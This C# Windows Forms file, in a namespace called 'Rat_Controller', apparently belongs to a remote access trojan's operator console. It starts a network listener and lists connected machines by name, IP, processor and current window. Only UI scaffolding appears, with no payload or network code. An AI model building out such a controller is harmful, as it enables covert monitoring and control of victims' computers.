using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Rat_Controller
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            Networking connectionInstance = new Networking();

            connectionInstance.startListen();
            int numberofConnections = 20;
            InitializeComponent();
            DataTable connections = new DataTable();
            connections.Columns.Add("ID");
            connections.Columns.Add("Name");
            connections.Columns.Add("IP");
            connections.Columns.Add("Processor");
            connections.Columns.Add("Time");
            connections.Columns.Add("Current Window");
            

            for (int i = 0;i < 20;i++)
            {
                connections.Rows.Add(i);
            }

            connectionTable.DataSource = connections;

            for(int i = 0; i< numberofConnections; i++)
            {
                connections.Rows[i][4] = connectionInstance.data;
                
            }
        }
    }
}
